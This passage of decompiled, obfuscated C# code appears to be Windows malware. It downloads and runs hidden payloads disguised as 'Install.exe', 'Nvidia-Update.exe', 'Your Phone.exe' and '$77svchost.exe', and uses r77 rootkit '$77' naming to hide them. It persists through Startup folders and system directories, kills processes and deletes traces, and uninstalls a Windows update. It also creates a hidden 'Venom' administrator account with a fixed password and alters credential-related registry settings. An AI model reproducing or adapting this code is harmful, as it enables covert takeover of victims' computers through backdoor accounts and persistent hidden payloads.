    string str = Path.Combine(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), name);
    new WebClient().DownloadFile(link, str);
    䫬칭Ģ馝ꃦ\uEF07될\uE49A钒ᗽ䩚\uF151鴛젣\u32CC䃥蹖疐䬚\uFFFD.邴ྂ쒜鮾蕉댬鬗뙊\u0BF9\u4DFF倎뜼\u26E8ୱ딄原稺驯掲\u250A(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
  }

  public static void 쿟귆\u2F8E\uF1A8湣哸ӂ\uFFFD뫠怩젌拶馸ᢣ磦킢\u28C5氺鐺徺(string link, string name)
  {
    string str = Path.Combine(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), name);
    new WebClient().DownloadFile(link, str);
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
  }

  public static void \u21CCᾢ禲蘴ဂᛦ絢\uE875舋\u31DF嵒\u33CA祔쫇먖ᦽ\uF1FE\uEA5C\uEF20臚()
  {
    foreach (string file in Directory.GetFiles(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "*.txt"))
      System.IO.File.Delete(file);
  }

  public static void \uE693䡭\u228C攩ك\uE861쯟멹\u29D5Ẳ媲䒮߆剺溂鯐㒦旧稄齊()
  {
    try
    {
      bool[] flagArray = new bool[2]{ true, false };
      foreach (bool flag in flagArray)
      {
        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
        {
          if ((registryKey.GetValue("AppInit_DLLs", (object) "") as string).Contains("$77-"))
            registryKey.SetValue("AppInit_DLLs", (object) "");
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public static void 㪚蛐\uEDF1瑯鹅\uF22D郹鯹陱\u223D골繆퓠굚沪봸\u2685Ꙝ\uE301汁()
  {
    string str = Path.Combine(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "Install.exe");
    System.IO.File.WriteAllBytes(str, 狥鍡\uFFFD\uEA90䠳Ꝋ晐䨝斲\u2E90\uEBC8ࡋ옖ᶧ랪깄쉙\uEA34攇䂳.Install);
    Process.Start(str);
    䫬칭Ģ馝ꃦ\uEF07될\uE49A钒ᗽ䩚\uF151鴛젣\u32CC䃥蹖疐䬚\uFFFD.邴ྂ쒜鮾蕉댬鬗뙊\u0BF9\u4DFF倎뜼\u26E8ୱ딄原稺驯掲\u250A(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ᨐ袜\uEDD1켥㗂勔萝쵧姠Ὸ놩궴\u218A멦셋㸠燊ᬥ廧\uE081();
  }

  public static void ഘ谏ჽم\u2039ꯖ\uEF8B嚜ᑥ꺗䵱묾灰帒蟼ᔖ튏꿶춅\u2F6E()
  {
    Process.Start("cmd.exe", "/c taskkill /f /im explorer.exe");
    Thread.Sleep(500);
    Process.Start(Environment.SystemDirectory + "\\..\\explorer.exe");
  }

  public static void 屽료\uE67E\uE7F2駙烮㞭㽷㫨ݙ晨羋뽃\uFBC7ꥲ앰쥯\uEE84歨䨃()
  {
    string str = Path.Combine(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "Nvidia-Update.exe");
    System.IO.File.WriteAllBytes(str, 狥鍡\uFFFD\uEA90䠳Ꝋ晐䨝斲\u2E90\uEBC8ࡋ옖ᶧ랪깄쉙\uEA34攇䂳.Chrome);
    Process.Start(str);
    䫬칭Ģ馝ꃦ\uEF07될\uE49A钒ᗽ䩚\uF151鴛젣\u32CC䃥蹖疐䬚\uFFFD.邴ྂ쒜鮾蕉댬鬗뙊\u0BF9\u4DFF倎뜼\u26E8ୱ딄原稺驯掲\u250A(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ᨐ袜\uEDD1켥㗂勔萝쵧姠Ὸ놩궴\u218A멦셋㸠燊ᬥ廧\uE081();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.ഘ谏ჽم\u2039ꯖ\uEF8B嚜ᑥ꺗䵱묾灰帒蟼ᔖ튏꿶춅\u2F6E();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.霺\uFFFD㬛㾘옱\u2714䥱\u2EC9\uE5F6\u2A59뎋\uFFFD絺鄜䟁錶볅\uFFFD聾뿘();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\u300E\uF25A溄\uE792\u31CD괪Ꚇ睴ᒟ\u2A18ᡌ\u24CB疤툟\uF3A6盔\u2F21合蘯翂();
  }

  public static void \uFFFD뷾揀队髄\uF096颯\u29ED믋牓\uE2BC鎆ꨊຼ뤊Ａ䁂쬪䟏揜() => Array.ForEach<Process>(Process.GetProcessesByName("cmd"), (Action<Process>) (x => x.Kill()));

  public static void ᨐ袜\uEDD1켥㗂勔萝쵧姠Ὸ놩궴\u218A멦셋㸠燊ᬥ廧\uE081() => 픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uFFFD뷾揀队髄\uF096颯\u29ED믋牓\uE2BC鎆ꨊຼ뤊Ａ䁂쬪䟏揜();

  public static void 霺\uFFFD㬛㾘옱\u2714䥱\u2EC9\uE5F6\u2A59뎋\uFFFD絺鄜䟁錶볅\uFFFD聾뿘()
  {
    Thread.Sleep(30000);
    foreach (string file in Directory.GetFiles(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "*.dll"))
      System.IO.File.Delete(file);
    foreach (string file in Directory.GetFiles(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "Install.exe"))
      System.IO.File.Delete(file);
    foreach (string file in Directory.GetFiles(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "Nvidia-Update.exe"))
      System.IO.File.Delete(file);
  }

  public static void \u300E\uF25A溄\uE792\u31CD괪Ꚇ睴ᒟ\u2A18ᡌ\u24CB疤툟\uF3A6盔\u2F21合蘯翂()
  {
    if (!System.IO.File.Exists(Path.Combine(Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030), "Install.exe")))
      return;
    string str1 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string[] files1 = Directory.GetFiles(str1, "r77-x64.dll");
    string destFileName1 = Path.Combine(str1, "$77-x64.dll");
    foreach (string sourceFileName in files1)
      System.IO.File.Move(sourceFileName, destFileName1);
    string str2 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string[] files2 = Directory.GetFiles(str2, "r77-x64.dll");
    string destFileName2 = Path.Combine(str2, "$77-x86.dll");
    foreach (string sourceFileName in files2)
      System.IO.File.Move(sourceFileName, destFileName2);
    string str3 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string[] files3 = Directory.GetFiles(str3, "Install.exe");
    string destFileName3 = Path.Combine(str3, "$77-Install.exe");
    foreach (string sourceFileName in files3)
      System.IO.File.Move(sourceFileName, destFileName3);
    string str4 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string[] files4 = Directory.GetFiles(str4, "Nvidia-Update.exe");
    string destFileName4 = Path.Combine(str4, "$77-Nvidia-Update.exe");
    foreach (string sourceFileName in files4)
      System.IO.File.Move(sourceFileName, destFileName4);
  }

  public static void 팚貓\uA636ፙ撛ྰ鸍势䍫\uF1CEᕟ쾇钀\uFFFD\u24EA\u0DF9\u1FBF\u00AFꫮ邰()
  {
    string destFileName1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "Your Phone.exe");
    System.IO.File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, destFileName1);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName1
    });
    string destFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Your Phone.exe");
    System.IO.File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, destFileName2);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName2
    });
    string destFileName3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "$77Your Phone.exe");
    System.IO.File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, destFileName3);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName3
    });
    string destFileName4 = "C:\\users\\public\\$77sys.exe";
    System.IO.File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, destFileName4);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName4
    });
    string destFileName5 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "$77svchost.exe");
    System.IO.File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, destFileName5);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName5
    });
    string destFileName6 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "$77svchost.exe");
    System.IO.File.Copy(熋劬\uE3BE렺蓮\uE89B窑陼\u204B䵜膡闸洠\u2E40䙭\uE8F7낒껨鹗䯼.InstallPath, destFileName6);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName6
    });
  }

  public static void 覕\u22CDꎨ캏\uF2B1쉓㦢룬彰떏\uEE3C둫伏㲈즗Ⱆ螣\uEB7Dࣥ貃()
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user1.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = "Venom";
        string newPassword2 = "Venom";
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }
}
